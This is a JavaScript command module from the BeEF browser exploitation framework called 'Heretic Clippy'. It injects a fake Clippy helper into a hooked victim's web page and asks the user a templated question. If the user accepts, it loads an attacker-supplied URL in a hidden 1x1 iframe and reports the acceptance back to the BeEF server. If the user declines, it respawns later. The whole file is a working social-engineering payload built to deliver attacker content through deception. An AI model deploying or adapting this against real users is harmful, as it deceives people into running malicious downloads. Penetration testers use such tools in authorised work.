//
// Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {
  
/**
 * Heretic Clippy
 * @version 1.0.0
 * @author sprky0
 * @modified vt & denden
**/

function __clippyboot(run) {
	var _run = run;
	if (!document.getElementsByTagName("body")[0]) {
		setTimeout(function(){__clippyboot(_run);},10);
	} else {
		_run();
	}
}

var GUID = {base:"_",cur:0,get:function(){this.cur++;return this.base+this.cur;}}

var HelpText = function(_question,reusable) {
	this.question = _question;
	this.options = [];
	this.key = GUID.get();
	this.views = 0;
	this.reusable = (reusable === true);
	this.timeout = {};
	return this;
}
HelpText.prototype.available = function() {
	return (this.views < 1 || this.reusable === true);
}
HelpText.prototype.addResponseURL = function(_text,_url) {
	this.options.push({text:_text,URL:_url,rel:"external"});
	return;
}
HelpText.prototype.addResponse = function(_text,_callback) {
	this.options.push({text:_text,callback:_callback,rel:"internal"});
	return;
}
HelpText.prototype.addTimeout = function(_timeout,_callback) {
	this.timeout = {callback:_callback,timeout:_timeout};
}
HelpText.prototype.getKey = function() {return this.key;}
HelpText.prototype.toString = function() {
	return this.question;
}
HelpText.prototype.toString = function() {
	return this.getKey();	
}
HelpText.prototype.toElements = function() {

	this.views++;

	var div = document.createElement('div');
	var p = document.createElement('p');
	p.innerHTML = this.question;
	div.appendChild(p);

	for(var i = 0; i < this.options.length; i++) {
		var button = document.createElement('button');
		button.innerHTML = this.options[i].text;
		if (this.options[i].rel == "internal")
			button.onclick = this.options[i].callback;
		else {
			var _Option = this.options[i];
			button.onclick = function(){
				window.location = _Option.URL;
			}
		}
		div.appendChild(button);
	}

	if (this.timeout.callback && typeof(this.timeout.callback) == "function") {
		setTimeout(this.timeout.callback, (this.timeout.timeout ? this.timeout.timeout : 500));
	}

	return div;
}

/* CLIPPY Display */
var ClippyDisplay = function(options) {

	this.file_dir = (options.file_dir) ? options.file_dir : "";

	this.div = document.createElement('div');
	this.div.style.zIndex = 1000000;
	this.div.style.width = "102px";
	this.div.style.height = "98px";
	this.div.style.backgroundColor = "transparent";
	this.div.style.position = "absolute";
	this.div.style.bottom = 0;
	this.div.style.color = "black";
	this.div.style.right = "60px";
	this.div.style.display = "inline";

	if (navigator.userAgent.match(/MSIE/)) {
		this.div.style.filter = "revealTrans(transition=12,duration=1.8)";
	}
	else {
		var img = new Image();
			img.src = this.file_dir + "clippy-main.png";
			img.style.position = "relative";
			img.style.display = "block";
			img.id = "clippyid";

		this.div.appendChild(img);
	}

	this.div.style.opacity = (options.visible === false) ? 0 : 1;

	return this;
}
ClippyDisplay.prototype.getElement = function() {
	return this.div || null;
}
ClippyDisplay.prototype.fadeIn = function(duration,options) {

	var _clipple = this;

	if (!options) 
		options = {};
	if (!options.step)
		options.step = 1 / 200;
	if (!options.value)
		options.value = 0;
	if (!options.remain)
		options.remain = 199;
	if (!options.increment)
		options.increment = duration / 200;

	options.remain--;
	options.value += options.step;
	
	if (navigator.userAgent.match(/MSIE/)) {
		imgfile = _clipple.file_dir + "clippy-main.png";
		_clipple.div.filters[0].Apply();
		_clipple.div.innerHTML="<img src='"+imgfile+"' />";
		_clipple.div.filters[0].Play();
	}
	else {
		_clipple.div.style.opacity = options.value;
		if (options.remain > 0) { setTimeout(function(){_clipple.fadeIn(duration,options);}, options.increment); }
	}

	return;
}


ClippyDisplay.prototype.fadeOut = function(duration,options) {

	var _clipple = this;

	if (!options) 
		options = {};
	if (!options.step)
		options.step = 1 / 200;
	if (!options.value)
		options.value = 1;
	if (!options.remain)
		options.remain = 199;
	if (!options.increment)
		options.increment = duration / 200;

	options.remain--;
	options.value -= options.step;
	_clipple.div.style.opacity = options.value;
	


	if (navigator.userAgent.match(/MSIE/)) {
		document.body.removeChild(document.getElementById("pipes"));
	}
	else {
		if (options.remain > 0) { 
			setTimeout(function(){_clipple.fadeOut(duration,options);}, options.increment); 
		}	
		else{ 
			document.body.removeChild(document.getElementById("pipes"));
		}
	}

	return;
}


/** SPEECH BUBBLE **/

var PopupDisplay = function(o,options) {

	this.file_dir = (options.file_dir) ? options.file_dir : "";

	if (typeof(o) === "string") {
		p = document.createElement('p');
		p.innerHTML = o;
		o = p;
	}

	this.div = document.createElement('div');
	this.div.style.zIndex = 1000000;
	this.div.style.width = "130px";
	this.div.style.height = "auto";
	this.div.style.backgroundColor = "transparent";
	this.div.style.color = "black";
	this.div.style.position = "absolute";
	this.div.style.bottom = "85px";
	this.div.style.right = "55px";
	this.div.style.display = "block";

	var imgTop = new Image();
	imgTop.src = this.file_dir + "clippy-speech-top.png";
	imgTop.style.position = "relative";
	imgTop.style.display = "block";
	this.div.appendChild(imgTop);

	this.message = document.createElement('div');
	this.message.style.background = "transparent url('" + this.file_dir + "clippy-speech-mid.png') top left repeat-y";
	this.message.style.padding = "8px";
	this.message.style.font = "11.5px Arial, Verdana, Sans";
	this.message.appendChild(o);

	this.div.appendChild(this.message);

	var imgBottom = new Image();
	imgBottom.src = this.file_dir + "clippy-speech-bottom.png";
	imgBottom.style.position = "relative";
	imgBottom.style.display = "block";
	this.div.appendChild(imgBottom);

	return this;
}
PopupDisplay.prototype.close = function() {
	try {
		var div = this.getElement();
		if (div != null && div.parentNode) {
			div = div.parentNode;
			div.removeChild(this.getElement());
		}
	} catch(e) {
		// alert(e)
	}
}
PopupDisplay.prototype.getElement = function() {
	return this.div;
}


/** CLIPPY controller **/

var Clippy = function(_homeSelector,file_dir) {
	this.help = {};
	// What options are OK to use as an introductory question?
	this.firstlines = [];
	this.homebase = this.findHomeBase(_homeSelector);
	this.timer = false;
	this.file_dir = file_dir;
	return this;
}
Clippy.prototype.findHomeBase = function(selector) {

	if (!selector)
		selector = "body";

	var ref = false;
	
	if (selector.charAt(0)=="#") {
		ref = document.getElementById(selector);
	} else {
		ref = document.getElementsByTagName(selector)[0];

		var div = document.createElement("div");

		div.style.zIndex = 9999999;
		div.id = "pipes";
		div.style.width = "300px";
		div.style.height = "300px";
		div.style.backgroundColor = "transparent";
		div.style.position = "fixed";
		div.style.bottom = "0";
		div.style.right = "0";
		
		ref.appendChild(div);

		return div;
	
	}
	
	beef.debug(ref);
	
	return ref;
}
Clippy.prototype.run = function(opt) {

	var _c = this;

	this.character = new ClippyDisplay({
		file_dir : this.file_dir,
		visible : false
	});
	this.homebase.appendChild( this.character.getElement() );
	this.character.fadeIn(1000);

	var Help = new HelpText("<%== @askusertext %>");
		Help.addResponse("Yes", function(){ _c.hahaha(); } );
		Help.addResponse("Not now", function(){  _c.killClippy(); setTimeout(function() { new Clippy("body","<%== @clippydir %>").run(); },"<%== @respawntime %>");  } );
	this.addHelp(Help,true);

	// initial wait
	this.talkLater();

}
Clippy.prototype.killClippy = function(){

		this.closeBubble();
		this.character.fadeOut(1000);
}
Clippy.prototype.hahaha = function() {
	
		var div = document.createElement("div");
		var _c = this;
		div.id = "heehee";
		div.style.display = "none";
		div.innerHTML="<iframe src='<%== @executeyes %>' width=1 height=1 style='display:none'></iframe>";
		
		document.body.appendChild(div);
		_c.openBubble("<%== @thankyoumessage %>");
		setTimeout(function () { _c.killClippy(); }, 5000); 
		beef.net.send('<%= @command_url %>', <%= @command_id %>, 'answer=user has accepted');

}
Clippy.prototype.addHelp = function(_help, is_startphrase) {
	this.help[ _help.getKey() ] = _help;
	if (is_startphrase)
		this.firstlines.push( _help.getKey() );

	return;
}
Clippy.prototype.sayOne = function(keys,alternative) {

	var found = false, count = 0;
	
	while(count < keys.length) {
		var choice = parseInt( Math.random() * keys.length );
		if( this.canSay( keys[choice]) ) {
			this.say(keys[choice]);
			return;
		}
		count ++;
	}

	return;
}
Clippy.prototype.canSay = function(key) {
	return this.help[ key ].available();
}
Clippy.prototype.say = function(key,alternative) {

	if (this.timer != false) {
		try {
			clearTimeout(this.timer);
			this.timer = false;
		} catch(e) {}
	}

	if(typeof(key) !== "string" && key.length)
		this.sayOne(key,alternative);

	this.openBubble( this.help[ key ].toElements() );
}
Clippy.prototype.firstLine = function() {
	this.sayOne(this.firstlines);	
}
Clippy.prototype.talkLater = function() {
	this.closeBubble(); 
	var _c = this;
	this.timer = setTimeout( function() { _c.firstLine(); }, 2000);
}
Clippy.prototype.openBubble = function(_o) {

	if (typeof(_o)=="string") {
		var o = document.createElement("p");
		o.innerHTML = _o;
	} else {
		var o = _o;
	}

	if (this.bubble) {
		this.bubble.close();
	}

	this.bubble = new PopupDisplay(o,{file_dir:this.file_dir});
	this.homebase.appendChild(this.bubble.getElement());

}
Clippy.prototype.closeBubble = function() {
	if (this.bubble) {
		this.bubble.close();
	}
}

/* APPLICATION LOGIC: */
// function clippy_boot() {if(document.getElementsByTagName("BODY").length === 0) {setTimeout("clippy_boot()",1);} else {clippy_main();}return;}
// function clippy_main() {var c = new Clippy("homebase","./").run();}
/* GO! */
// clippy_boot();

__clippyboot(function(){new Clippy("body","<%== @clippydir %>").run();});

});
